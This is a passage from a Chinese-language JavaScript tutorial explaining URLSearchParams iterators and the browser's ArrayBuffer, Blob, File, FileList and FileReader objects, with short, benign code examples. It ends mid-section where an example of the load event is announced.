<h4 id="4-9-URLSearchParams-keys-，URLSearchParams-values-，URLSearchParams-entries"><a href="#4-9-URLSearchParams-keys-，URLSearchParams-values-，URLSearchParams-entries" class="headerlink" title="4.9 URLSearchParams.keys()，URLSearchParams.values()，URLSearchParams.entries()"></a>4.9 URLSearchParams.keys()，URLSearchParams.values()，URLSearchParams.entries()</h4><p>这三个方法都返回一个遍历器对象，供<code>for...of</code>循环遍历。它们的区别在于，<code>keys</code>方法返回的是键名的遍历器，<code>values</code>方法返回的是键值的遍历器，<code>entries</code>返回的是键值对的遍历器。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="string">&#x27;a=1&amp;b=2&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> p <span class="keyword">of</span> params.<span class="title function_">keys</span>()) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// a</span></span><br><span class="line"><span class="comment">// b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> p <span class="keyword">of</span> params.<span class="title function_">values</span>()) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> p <span class="keyword">of</span> params.<span class="title function_">entries</span>()) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// [&quot;a&quot;, &quot;1&quot;]</span></span><br><span class="line"><span class="comment">// [&quot;b&quot;, &quot;2&quot;]</span></span><br></pre></td></tr></table></figure>

<p>如果直接对<code>URLSearchParams</code>进行遍历，其实内部调用的就是<code>entries</code>接口。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> p <span class="keyword">of</span> params) &#123;&#125;</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> p <span class="keyword">of</span> params.<span class="title function_">entries</span>()) &#123;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="十一、ArrayBuffer-对象，Blob-对象"><a href="#十一、ArrayBuffer-对象，Blob-对象" class="headerlink" title="十一、ArrayBuffer 对象，Blob 对象"></a>十一、ArrayBuffer 对象，Blob 对象</h2><h3 id="1、ArrayBuffer-对象"><a href="#1、ArrayBuffer-对象" class="headerlink" title="1、ArrayBuffer 对象"></a>1、ArrayBuffer 对象</h3><p>ArrayBuffer 对象表示一段二进制数据，用来模拟内存里面的数据。通过这个对象，JavaScript 可以读写二进制数据。这个对象可以看作内存数据的表达。</p>
<p>这个对象是 ES6 才写入标准的，普通的网页编程用不到它，为了教程体系的完整，下面只提供一个简略的介绍，详细介绍请看《ES6 标准入门》里面的章节。</p>
<p>浏览器原生提供<code>ArrayBuffer()</code>构造函数，用来生成实例。它接受一个整数作为参数，表示这段二进制数据占用多少个字节。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);	</span><br></pre></td></tr></table></figure>

<p>上面代码中，实例对象<code>buffer</code>占用8个字节。</p>
<p>ArrayBuffer 对象有实例属性<code>byteLength</code>，表示当前实例占用的内存长度（单位字节）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">buffer.<span class="property">byteLength</span> <span class="comment">// 8</span></span><br></pre></td></tr></table></figure>

<p>ArrayBuffer 对象有实例方法<code>slice()</code>，用来复制一部分内存。它接受两个整数参数，分别表示复制的开始位置（从0开始）和结束位置（复制时不包括结束位置），如果省略第二个参数，则表示一直复制到结束。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf1 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> buf2 = buf1.<span class="title function_">slice</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码表示复制原来的实例。</p>
<h3 id="2、Blob-对象"><a href="#2、Blob-对象" class="headerlink" title="2、Blob 对象"></a>2、Blob 对象</h3><h4 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1 简介"></a>2.1 简介</h4><p>Blob 对象表示一个二进制文件的数据内容，比如一个图片文件的内容就可以通过 Blob 对象读写。它通常用来读写文件，它的名字是 Binary Large Object （二进制大型对象）的缩写。它与 ArrayBuffer 的区别在于，它用于操作二进制文件，而 ArrayBuffer 用于操作内存。</p>
<p>浏览器原生提供<code>Blob()</code>构造函数，用来生成实例对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Blob</span>(array [, options])</span><br></pre></td></tr></table></figure>

<p><code>Blob</code>构造函数接受两个参数。第一个参数是数组，成员是字符串或二进制对象，表示新生成的<code>Blob</code>实例对象的内容；第二个参数是可选的，是一个配置对象，目前只有一个属性<code>type</code>，它的值是一个字符串，表示数据的 MIME 类型，默认是空字符串。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> htmlFragment = [<span class="string">&#x27;&lt;a id=&quot;a&quot;&gt;&lt;b id=&quot;b&quot;&gt;hey!&lt;/b&gt;&lt;/a&gt;&#x27;</span>];</span><br><span class="line"><span class="keyword">var</span> myBlob = <span class="keyword">new</span> <span class="title class_">Blob</span>(htmlFragment, &#123;type : <span class="string">&#x27;text/html&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码中，实例对象<code>myBlob</code>包含的是字符串。生成实例的时候，数据类型指定为<code>text/html</code>。</p>
<p>下面是另一个例子，Blob 保存 JSON 数据。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">hello</span>: <span class="string">&#x27;world&#x27;</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> blob = <span class="keyword">new</span> <span class="title class_">Blob</span>([ <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj) ], &#123;type : <span class="string">&#x27;application/json&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure>



<h4 id="2-2-实例属性和实例方法"><a href="#2-2-实例属性和实例方法" class="headerlink" title="2.2 实例属性和实例方法"></a>2.2 实例属性和实例方法</h4><p><code>Blob</code>具有两个实例属性<code>size</code>和<code>type</code>，分别返回数据的大小和类型。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> htmlFragment = [<span class="string">&#x27;&lt;a id=&quot;a&quot;&gt;&lt;b id=&quot;b&quot;&gt;hey!&lt;/b&gt;&lt;/a&gt;&#x27;</span>];</span><br><span class="line"><span class="keyword">var</span> myBlob = <span class="keyword">new</span> <span class="title class_">Blob</span>(htmlFragment, &#123;type : <span class="string">&#x27;text/html&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">myBlob.<span class="property">size</span> <span class="comment">// 32</span></span><br><span class="line">myBlob.<span class="property">type</span> <span class="comment">// &quot;text/html&quot;</span></span><br></pre></td></tr></table></figure>

<p><code>Blob</code>具有一个实例方法<code>slice</code>，用来拷贝原来的数据，返回的也是一个<code>Blob</code>实例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myBlob.<span class="title function_">slice</span>(start, end, contentType)</span><br></pre></td></tr></table></figure>

<p><code>slice</code>方法有三个参数，都是可选的。它们依次是起始的字节位置（默认为0）、结束的字节位置（默认为<code>size</code>属性的值，该位置本身将不包含在拷贝的数据之中）、新实例的数据类型（默认为空字符串）。</p>
<h4 id="2-3-获取文件信息"><a href="#2-3-获取文件信息" class="headerlink" title="2.3 获取文件信息"></a>2.3 获取文件信息</h4><p>文件选择器<code>&lt;input type=&quot;file&quot;&gt;</code>用来让用户选取文件。出于安全考虑，浏览器不允许脚本自行设置这个控件的<code>value</code>属性，即文件必须是用户手动选取的，不能是脚本指定的。一旦用户选好了文件，脚本就可以读取这个文件。</p>
<p>文件选择器返回一个 FileList 对象，该对象是一个类似数组的成员，每个成员都是一个 File 实例对象。File 实例对象是一个特殊的 Blob 实例，增加了<code>name</code>和<code>lastModifiedDate</code>属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;input type=&quot;file&quot; accept=&quot;image/*&quot; multiple onchange=&quot;fileinfo(this.files)&quot;/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fileinfo</span>(<span class="params">files</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; files.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> f = files[i];</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">      f.<span class="property">name</span>, <span class="comment">// 文件名，不含路径</span></span><br><span class="line">      f.<span class="property">size</span>, <span class="comment">// 文件大小，Blob 实例属性</span></span><br><span class="line">      f.<span class="property">type</span>, <span class="comment">// 文件类型，Blob 实例属性</span></span><br><span class="line">      f.<span class="property">lastModifiedDate</span> <span class="comment">// 文件的最后修改时间</span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除了文件选择器，拖放 API 的<code>dataTransfer.files</code>返回的也是一个FileList 对象，它的成员因此也是 File 实例对象。</p>
<h4 id="2-4-下载文件"><a href="#2-4-下载文件" class="headerlink" title="2.4 下载文件"></a>2.4 下载文件</h4><p>AJAX 请求时，如果指定<code>responseType</code>属性为<code>blob</code>，下载下来的就是一个 Blob 对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getBlob</span>(<span class="params">url, callback</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">  xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, url);</span><br><span class="line">  xhr.<span class="property">responseType</span> = <span class="string">&#x27;blob&#x27;</span>;</span><br><span class="line">  xhr.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">callback</span>(xhr.<span class="property">response</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  xhr.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>xhr.response</code>拿到的就是一个 Blob 对象。</p>
<h4 id="2-5-生成-URL"><a href="#2-5-生成-URL" class="headerlink" title="2.5 生成 URL"></a>2.5 生成 URL</h4><p>浏览器允许使用<code>URL.createObjectURL()</code>方法，针对 Blob 对象生成一个临时 URL，以便于某些 API 使用。这个 URL 以<code>blob://</code>开头，表明对应一个 Blob 对象，协议头后面是一个识别符，用来唯一对应内存里面的 Blob 对象。这一点与<code>data://URL</code>（URL 包含实际数据）和<code>file://URL</code>（本地文件系统里面的文件）都不一样。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> droptarget = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;droptarget&#x27;</span>);</span><br><span class="line"></span><br><span class="line">droptarget.<span class="property">ondrop</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> files = e.<span class="property">dataTransfer</span>.<span class="property">files</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; files.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> type = files[i].<span class="property">type</span>;</span><br><span class="line">    <span class="keyword">if</span> (type.<span class="title function_">substring</span>(<span class="number">0</span>,<span class="number">6</span>) !== <span class="string">&#x27;image/&#x27;</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">    img.<span class="property">src</span> = <span class="variable constant_">URL</span>.<span class="title function_">createObjectURL</span>(files[i]);</span><br><span class="line">    img.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">width</span> = <span class="number">100</span>;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(<span class="variable language_">this</span>);</span><br><span class="line">      <span class="variable constant_">URL</span>.<span class="title function_">revokeObjectURL</span>(<span class="variable language_">this</span>.<span class="property">src</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码通过为拖放的图片文件生成一个 URL，产生它们的缩略图，从而使得用户可以预览选择的文件。</p>
<p>浏览器处理 Blob URL 就跟普通的 URL 一样，如果 Blob 对象不存在，返回404状态码；如果跨域请求，返回403状态码。Blob URL 只对 GET 请求有效，如果请求成功，返回200状态码。由于 Blob URL 就是普通 URL，因此可以下载。</p>
<h4 id="2-6-读取文件"><a href="#2-6-读取文件" class="headerlink" title="2.6 读取文件"></a>2.6 读取文件</h4><p>取得 Blob 对象以后，可以通过<code>FileReader</code>对象，读取 Blob 对象的内容，即文件内容。</p>
<p>FileReader 对象提供四个方法，处理 Blob 对象。Blob 对象作为参数传入这些方法，然后以指定的格式返回。</p>
<ul>
<li><code>FileReader.readAsText()</code>：返回文本，需要指定文本编码，默认为 UTF-8。</li>
<li><code>FileReader.readAsArrayBuffer()</code>：返回 ArrayBuffer 对象。</li>
<li><code>FileReader.readAsDataURL()</code>：返回 Data URL。</li>
<li><code>FileReader.readAsBinaryString()</code>：返回原始的二进制字符串。</li>
</ul>
<p>下面是<code>FileReader.readAsText()</code>方法的例子，用来读取文本文件。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;input type=’file&#x27; onchange=&#x27;readfile(this.files[0])&#x27;&gt;&lt;/input&gt;</span></span><br><span class="line"><span class="comment">// &lt;pre id=&#x27;output&#x27;&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">readfile</span>(<span class="params">f</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span><br><span class="line">  reader.<span class="title function_">readAsText</span>(f);</span><br><span class="line">  reader.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> text = reader.<span class="property">result</span>;</span><br><span class="line">    <span class="keyword">var</span> out = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;output&#x27;</span>);</span><br><span class="line">    out.<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    out.<span class="title function_">appendChild</span>(<span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(text));</span><br><span class="line">  &#125;</span><br><span class="line">  reader.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Error&#x27;</span>, e);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，通过指定 FileReader 实例对象的<code>onload</code>监听函数，在实例的<code>result</code>属性上拿到文件内容。</p>
<p>下面是<code>FileReader.readAsArrayBuffer()</code>方法的例子，用于读取二进制文件。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;input type=&quot;file&quot; onchange=&quot;typefile(this.files[0])&quot;&gt;&lt;/input&gt;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">typefile</span>(<span class="params">file</span>) &#123;</span><br><span class="line">  <span class="comment">// 文件开头的四个字节，生成一个 Blob 对象</span></span><br><span class="line">  <span class="keyword">var</span> slice = file.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">var</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span><br><span class="line">  <span class="comment">// 读取这四个字节</span></span><br><span class="line">  reader.<span class="title function_">readAsArrayBuffer</span>(slice);</span><br><span class="line">  reader.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> buffer = reader.<span class="property">result</span>;</span><br><span class="line">    <span class="comment">// 将这四个字节的内容，视作一个32位整数</span></span><br><span class="line">    <span class="keyword">var</span> view = <span class="keyword">new</span> <span class="title class_">DataView</span>(buffer);</span><br><span class="line">    <span class="keyword">var</span> magic = view.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// 根据文件的前四个字节，判断它的类型</span></span><br><span class="line">    <span class="keyword">switch</span>(magic) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x89504E47</span>: file.<span class="property">verified_type</span> = <span class="string">&#x27;image/png&#x27;</span>; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x47494638</span>: file.<span class="property">verified_type</span> = <span class="string">&#x27;image/gif&#x27;</span>; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x25504446</span>: file.<span class="property">verified_type</span> = <span class="string">&#x27;application/pdf&#x27;</span>; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x504b0304</span>: file.<span class="property">verified_type</span> = <span class="string">&#x27;application/zip&#x27;</span>; <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(file.<span class="property">name</span>, file.<span class="property">verified_type</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="十二、File-对象，FileList-对象，FileReader-对象"><a href="#十二、File-对象，FileList-对象，FileReader-对象" class="headerlink" title="十二、File 对象，FileList 对象，FileReader 对象"></a>十二、File 对象，FileList 对象，FileReader 对象</h2><h3 id="1、File-对象"><a href="#1、File-对象" class="headerlink" title="1、File 对象"></a>1、File 对象</h3><p>File 对象代表一个文件，用来读写文件信息。它继承了 Blob 对象，或者说是一种特殊的 Blob 对象，所有可以使用 Blob 对象的场合都可以使用它。</p>
<p>最常见的使用场合是表单的文件上传控件（&#96;&#96;），用户选中文件以后，浏览器就会生成一个数组，里面是每一个用户选中的文件，它们都是 File 实例对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;input id=&quot;fileItem&quot; type=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fileItem&#x27;</span>).<span class="property">files</span>[<span class="number">0</span>];</span><br><span class="line">file <span class="keyword">instanceof</span> <span class="title class_">File</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>file</code>是用户选中的第一个文件，它是 File 的实例。</p>
<h4 id="1-1-构造函数"><a href="#1-1-构造函数" class="headerlink" title="1.1 构造函数"></a>1.1 构造函数</h4><p>浏览器原生提供一个<code>File()</code>构造函数，用来生成 File 实例对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">File</span>(array, name [, options])</span><br></pre></td></tr></table></figure>

<p><code>File()</code>构造函数接受三个参数。</p>
<ul>
<li>array：一个数组，成员可以是二进制对象或字符串，表示文件的内容。</li>
<li>name：字符串，表示文件名或文件路径。</li>
<li>options：配置对象，设置实例的属性。该参数可选。</li>
</ul>
<p>第三个参数配置对象，可以设置两个属性。</p>
<ul>
<li>type：字符串，表示实例对象的 MIME 类型，默认值为空字符串。</li>
<li>lastModified：时间戳，表示上次修改的时间，默认为<code>Date.now()</code>。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> file = <span class="keyword">new</span> <span class="title class_">File</span>(</span><br><span class="line">  [<span class="string">&#x27;foo&#x27;</span>],</span><br><span class="line">  <span class="string">&#x27;foo.txt&#x27;</span>,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;text/plain&#x27;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>



<h4 id="1-2-实例属性和实例方法"><a href="#1-2-实例属性和实例方法" class="headerlink" title="1.2 实例属性和实例方法"></a>1.2 实例属性和实例方法</h4><p>File 对象有以下实例属性。</p>
<ul>
<li>File.lastModified：最后修改时间</li>
<li>File.name：文件名或文件路径</li>
<li>File.size：文件大小（单位字节）</li>
<li>File.type：文件的 MIME 类型</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myFile = <span class="keyword">new</span> <span class="title class_">File</span>([], <span class="string">&#x27;file.bin&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">lastModified</span>: <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="number">2018</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">&#125;);</span><br><span class="line">myFile.<span class="property">lastModified</span> <span class="comment">// 1517414400000</span></span><br><span class="line">myFile.<span class="property">name</span> <span class="comment">// &quot;file.bin&quot;</span></span><br><span class="line">myFile.<span class="property">size</span> <span class="comment">// 0</span></span><br><span class="line">myFile.<span class="property">type</span> <span class="comment">// &quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，由于<code>myFile</code>的内容为空，也没有设置 MIME 类型，所以<code>size</code>属性等于0，<code>type</code>属性等于空字符串。</p>
<p>File 对象没有自己的实例方法，由于继承了 Blob 对象，因此可以使用 Blob 的实例方法<code>slice()</code>。</p>
<h3 id="2、FileList-对象"><a href="#2、FileList-对象" class="headerlink" title="2、FileList 对象"></a>2、FileList 对象</h3><p><code>FileList</code>对象是一个类似数组的对象，代表一组选中的文件，每个成员都是一个 File 实例。它主要出现在两个场合。</p>
<ul>
<li>文件控件节点（&#96;&#96;）的<code>files</code>属性，返回一个 FileList 实例。</li>
<li>拖拉一组文件时，目标区的<code>DataTransfer.files</code>属性，返回一个 FileList 实例。</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;input id=&quot;fileItem&quot; type=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> files = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fileItem&#x27;</span>).<span class="property">files</span>;</span><br><span class="line">files <span class="keyword">instanceof</span> <span class="title class_">FileList</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，文件控件的<code>files</code>属性是一个 FileList 实例。</p>
<p>FileList 的实例属性主要是<code>length</code>，表示包含多少个文件。</p>
<p>FileList 的实例方法主要是<code>item()</code>，用来返回指定位置的实例。它接受一个整数作为参数，表示位置的序号（从零开始）。但是，由于 FileList 的实例是一个类似数组的对象，可以直接用方括号运算符，即<code>myFileList[0]</code>等同于<code>myFileList.item(0)</code>，所以一般用不到<code>item()</code>方法。</p>
<h3 id="3、FileReader-对象"><a href="#3、FileReader-对象" class="headerlink" title="3、FileReader 对象"></a>3、FileReader 对象</h3><p>FileReader 对象用于读取 File 对象或 Blob 对象所包含的文件内容。</p>
<p>浏览器原生提供一个<code>FileReader</code>构造函数，用来生成 FileReader 实例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span><br></pre></td></tr></table></figure>

<p>FileReader 有以下的实例属性。</p>
<ul>
<li>FileReader.error：读取文件时产生的错误对象</li>
<li>FileReader.readyState：整数，表示读取文件时的当前状态。一共有三种可能的状态，<code>0</code>表示尚未加载任何数据，<code>1</code>表示数据正在加载，<code>2</code>表示加载完成。</li>
<li>FileReader.result：读取完成后的文件内容，有可能是字符串，也可能是一个 ArrayBuffer 实例。</li>
<li>FileReader.onabort：<code>abort</code>事件（用户终止读取操作）的监听函数。</li>
<li>FileReader.onerror：<code>error</code>事件（读取错误）的监听函数。</li>
<li>FileReader.onload：<code>load</code>事件（读取操作完成）的监听函数，通常在这个函数里面使用<code>result</code>属性，拿到文件内容。</li>
<li>FileReader.onloadstart：<code>loadstart</code>事件（读取操作开始）的监听函数。</li>
<li>FileReader.onloadend：<code>loadend</code>事件（读取操作结束）的监听函数。</li>
<li>FileReader.onprogress：<code>progress</code>事件（读取操作进行中）的监听函数。</li>
</ul>
<p>下面是监听<code>load</code>事件的一个例子。</p>
